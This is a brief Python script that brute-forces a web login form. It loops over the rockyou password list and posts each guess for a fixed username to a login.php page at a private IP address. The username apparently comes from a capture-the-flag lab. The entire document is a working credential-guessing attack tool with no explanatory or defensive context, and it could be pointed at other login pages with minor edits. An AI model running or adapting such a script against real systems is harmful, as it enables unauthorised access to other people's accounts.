# Brute-force
# Copy curl from devtools, then convert to python with https://curl.trillworks.com/

import requests

USER = 'R1ckRul3s'
FILE = '/usr/share/wordlists/rockyou.txt'
ADDRESS = 'http://10.10.80.188/login.php'


cookies = {
    'PHPSESSID': 'funm129tnonpqil3s00p2rn6d0',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://10.10.80.188/login.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

file = open(FILE, 'rb')
passwords = file.readlines()
num_lines = len(passwords)

for index, password in enumerate(passwords, 0):
    pw = password.strip()
    data = {
        'username': USER,
        'password': pw,
        'sub': 'Login'
    }
    res = requests.post(ADDRESS, headers=headers, cookies=cookies, data=data)
    if not 'Invalid username or password.' in res.text:
        print('found password' + pw)
        quit()
    else:
        if index % 100 == 0:
            print('processed passwords:', index, 'of', num_lines, '. Left: ', num_lines - index)
